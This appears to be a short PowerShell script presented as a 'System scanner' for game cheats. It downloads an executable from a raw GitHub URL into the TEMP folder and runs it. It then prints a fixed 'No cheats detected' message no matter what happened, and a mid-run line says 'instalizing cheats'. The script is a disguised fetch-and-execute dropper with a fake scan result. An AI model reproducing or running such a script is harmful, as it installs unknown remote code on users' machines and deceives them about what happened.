Write-Host "System scanner" -ForegroundColor Cyan
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/fundrug35-jpg/asdvcasd/main/Checkeeer.exe" -OutFile "$env:TEMP\Checkeeer.exe" -UseBasicParsing
Write-Host "instalizing cheats" -ForegroundColor Yellow
& "$env:TEMP\Checkeeer.exe"
Write-Host "No cheats detected" -ForegroundColor Green
